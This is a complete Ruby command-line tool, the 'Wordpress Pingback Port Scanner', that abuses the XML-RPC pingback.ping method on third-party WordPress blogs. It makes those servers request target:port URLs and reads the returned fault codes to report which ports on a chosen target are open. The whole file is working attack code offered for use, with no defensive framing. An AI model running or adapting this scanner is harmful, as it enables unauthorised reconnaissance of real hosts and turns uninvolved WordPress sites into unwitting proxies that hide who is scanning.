#!/usr/bin/env ruby

#gem 'typhoeus', '= 0.5.3'
#gem 'typhoeus', '= 0.4.2'
require "getoptlong"
require "typhoeus"

opts = GetoptLong.new(
  [ '--help', '-h', "-?", GetoptLong::NO_ARGUMENT ],
  [ '--target', "-t" , GetoptLong::OPTIONAL_ARGUMENT ],
  [ '--all-ports', "-a" , GetoptLong::NO_ARGUMENT ],
  [ '--verbose', "-v" , GetoptLong::NO_ARGUMENT ]
)

# Display the usage
def usage
  puts"Wordpress Pingback Port Scanner

Usage: wppp.rb [OPTION] ... TARGETS
  --help, -h: show help
  --target, -t X: the target to scan - default localhost
  --all-ports, -a: Scan all ports. Default is to scan only some common ports
  --verbose, -v: verbose

  TARGETS: a space separated list of targets to use for scanning (must provide a XML-RPC Url)

"
  exit
end

def colorize(text, color_code)
  "\e[#{color_code}m#{text}\e[0m"
end

def red(text)
  colorize(text, 31)
end

def green(text)
  colorize(text, 32)
end

def yellow(text)
  colorize(text, 33)
end

def logo
  puts
  puts "   _      __            __                       ___  _           __            __"
  puts "  | | /| / /__  _______/ /__  _______ ___ ___   / _ \\(_)__  ___ _/ /  ___ _____/ /__"
  puts "  | |/ |/ / _ \\/ __/ _  / _ \\/ __/ -_|_-<(_-<  / ___/ / _ \\/ _ `/ _ \\/ _ `/ __/  '_/"
  puts "  |__/|__/\\___/_/  \\_,_/ .__/_/  \\__/___/___/ /_/  /_/_//_/\\_, /_.__/\\_,_/\\__/_/\\_\\ "
  puts "     ___           __  /_/___                              /___/                     "
  puts "    / _ \\___  ____/ /_  / __/______ ____  ___  ___ ____                              "
  puts "   / ___/ _ \\/ __/ __/ _\\ \\/ __/ _ `/ _ \\/ _ \\/ -_) __/                              "
  puts "  /_/   \\___/_/  \\__/ /___/\\__/\\_,_/_//_/_//_/\\__/_/                                 "
  puts
  puts
end

def generate_pingback_xml (target, valid_blog_post)
  xml = "<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>"
  xml << "<methodCall>"
  xml << "<methodName>pingback.ping</methodName>"
  xml << "<params>"
  xml << "<param><value><string>#{target}</string></value></param>"
  xml << "<param><value><string>#{valid_blog_post}</string></value></param>"
  xml << "</params>"
  xml << "</methodCall>"
  xml
end

def get_xml_rpc_url(url)
  if Gem.loaded_specs["typhoeus"].version >= Gem::Version.create(0.5)
    resp = Typhoeus::Request.head(url,
                                  :followlocation => true,
                                  :maxredirs => 10,
                                  :timeout => 5000,
    )
  else
    resp = Typhoeus::Request.head(url,
                                  :follow_location => true,
                                  :max_redirects => 10,
                                  :timeout => 5000,
    )
  end
  headers = resp.headers_hash
  value = headers["x-pingback"]
  if value.nil? or value.empty?
    raise("Url #{url} does not provide a XML-RPC url")
  else
    xmlrpc_url = value
  end
  xmlrpc_url
end

def get_pingback_request(xml_rpc, target, blog_post)
  pingback_xml = generate_pingback_xml(target, blog_post)
  if Gem.loaded_specs["typhoeus"].version >= Gem::Version.create(0.5)
    pingback_request = Typhoeus::Request.new(xml_rpc,
        :followlocation => true,
        :maxredirs => 10,
        :timeout => 10000,
        :method => :post,
        :body => pingback_xml
    )
  else
    pingback_request = Typhoeus::Request.new(xml_rpc,
        :follow_location => true,
        :max_redirects => 10,
        :timeout => 10000,
        :method => :post,
        :body => pingback_xml
    )
  end
  pingback_request
end

def get_valid_blog_post(xml_rpcs)
  blog_posts = []
  xml_rpcs.each do |xml_rpc|
    url = xml_rpc.sub(/\/xmlrpc\.php$/, "")
    # Get valid URLs from Wordpress Feed
    feed_url = "#{url}/?feed=rss2"
    if Gem.loaded_specs["typhoeus"].version >= Gem::Version.create(0.5)
      params = { :followlocation => true, :maxredirs => 10 }
    else
      params = { :follow_location => true, :max_redirects => 10 }
    end
    response = Typhoeus::Request.get(feed_url, params)
    links = response.body.scan(/<link>([^<]+)<\/link>/i)
    if response.code != 200 or links.nil? or links.empty?
      raise("No valid blog posts found for xmlrpc #{xml_rpc}")
    end
    links.each do |link|
      temp_link = link[0]
      # Test if pingback is enabled for extracted link
      pingback_request = get_pingback_request(xml_rpc, "http://www.google.com", temp_link)
      @hydra.queue(pingback_request)
      @hydra.run
      pingback_response = pingback_request.response
      # No Pingback for post enabled: <value><int>33</int></value>
      pingback_disabled_match = pingback_response.body.match(/<value><int>33<\/int><\/value>/i)
      if pingback_response.code == 200 and pingback_disabled_match.nil?
        puts "Found valid post under #{temp_link}"
        blog_posts << {:xml_rpc => xml_rpc, :blog_post => temp_link}
        break
      end
    end
  end

  if blog_posts.nil? or blog_posts.empty?
    raise("No valid posts with pingback enabled found")
  end

  blog_posts
end

def generate_requests(xml_rpcs, target)
  port_range = @all_ports ? (0...65535) : %w(21 22 25 53 80 106 110 143 443 3306 3389 8443 9999)
  port_range.each do |i|
    random = (0...8).map{65.+(rand(26)).chr}.join
    xml_rpc_hash = xml_rpcs.sample
    domain = i == "443" ? target.sub(/^http:\/\//i, "https://") : target
    url = "#{domain}:#{i}/#{random}/"
    pingback_request = get_pingback_request(xml_rpc_hash[:xml_rpc], url, xml_rpc_hash[:blog_post])
    pingback_request.on_complete do |response|
      # Closed: <value><int>16</int></value>
      closed_match = response.body.match(/<value><int>16<\/int><\/value>/i)
      if response.code == 200 and closed_match.nil?
        puts green("Port #{i} is open")
      else
        puts yellow("Port #{i} is closed")
      end
      if @verbose
        puts "URL: #{url}"
        puts "Response Code: #{response.code}"
        puts response.body
        puts "##################################"
      end
    end
    @hydra.queue(pingback_request)
  end
end

begin
  logo

  @verbose = false
  @all_ports = false
  target = "http://localhost"
  xml_rpcs = []

  begin
    opts.each do |opt, arg|
      case opt
        when '--help'
          usage
        when "--target"
          if arg !~ /^http/
            target = "http://" + arg
          else
            target = arg
          end
        when "--all-ports"
          @all_ports = true
        when "--verbose"
          @verbose = true
        else
          raise("Unknown option #{opt}")
      end
    end
  rescue GetoptLong::InvalidOption
    puts
    usage
    exit
  end

  if ARGV.length == 0
    puts
    usage
    exit 1
  end

  # Parse XML RPCs
  ARGV.each do |site|
    url_cleanup = site.sub(/\/xmlrpc\.php$/i, "/")
    # add trailing slash
    url_cleanup =~ /\/$/ ? url_cleanup : "#{url_cleanup}/"
    xml_rpcs << get_xml_rpc_url(url_cleanup)
  end

  if xml_rpcs.nil? or xml_rpcs.empty?
    raise("No valid XML-RPC interfaces found")
  end

  @hydra = Typhoeus::Hydra.new(:max_concurrency => 10)

  puts "Getting valid blog posts for pingback..."
  hash = get_valid_blog_post(xml_rpcs)
  puts "Starting portscan..."
  generate_requests(hash, target)
  @hydra.run
rescue => e
  puts red("[ERROR] #{e.message}")
  puts red("Trace :")
  puts red(e.backtrace.join("\n"))
end
